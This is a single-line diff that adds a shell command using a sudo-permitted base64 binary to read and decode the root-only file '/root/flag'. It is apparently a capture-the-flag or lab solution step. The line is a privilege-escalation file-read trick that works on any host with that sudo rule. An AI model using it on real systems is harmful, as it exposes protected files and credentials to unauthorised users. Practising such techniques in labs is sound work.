@@ -1,0 +1,1 @@
+sudo /usr/bin/base64 /root/flag | base64 -d
